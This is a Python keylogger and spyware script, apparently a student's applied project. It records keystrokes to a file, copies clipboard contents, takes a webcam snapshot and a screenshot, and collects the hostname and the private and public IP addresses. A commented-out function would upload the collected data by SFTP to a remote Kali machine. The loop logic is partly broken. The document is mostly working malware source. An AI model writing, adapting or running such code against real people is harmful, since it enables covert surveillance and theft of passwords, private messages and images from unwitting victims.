# Libraries
import cv2
from threading import Timer
import pysftp
import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener
import pyscreenshot

import time
import os

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
camera_information = ".png"
screenshot_information = ".png"

keys_information_enc = "e_key_log.txt"
system_information_enc = "e_systeminfo.txt"
clipboard_information_enc = "e_clipboard.txt"

time_iterations = 15
number_of_iterations_end = 3

myHostname = ""  # change this
myUsername = ""  # change this
myPassword = ""  # change this

file_path = "D:\\Stuff\\D studies\\Adv dip of it\\Semester 5\\Applied projects\\Keylogger\\Project"
extend = "\\"
file_merge = file_path + extend


# def send_sftp(filename):
#   srv = pysftp.Connection(host=myHostname, username=myUsername, password=myPassword)
#   print("Connection Successfully Established")
#   srv.chdir('home/kali/Desktop/keylog_data')
#   srv.put(filename)

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        ipAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ipAddr + "\n")


computer_information()


# only string will be recorded
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard Data could not be retrieved")


copy_clipboard()


def captureWebcam():
    camera = cv2.VideoCapture(0)
    time_str = time.strftime("IMG_%Y%m%d_%H%M%S")
    check, frame = camera.read()
    cv2.waitKey(0)
    camera.release()
    cv2.imwrite(file_path + extend + time_str + camera_information, frame)


captureWebcam()


def screenshots():
    imgrb = ImageGrab.grab()
    time_str = time.strftime("SGB_%Y%m%d_%H%M%S")
    imgrb.save(file_path + extend + time_str + screenshot_information)


screenshots()

number_of_iterations = 0
currentTime = time.time()
stopTime = time.time() + time_iterations

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Keys") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stopTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if currentTime > stopTime:
    # screenshots()
    # send_sftp(screenshot_information, file_path + extend + screenshot_information, srv)

    # captureWebcam()
    # send_sftp(screenshot_information, file_path + extend + camera_information, srv)

    # copy_clipboard()
    number_of_iterations += 1

    currentTime = time.time()
    stopTime = time.time() + time_iterations
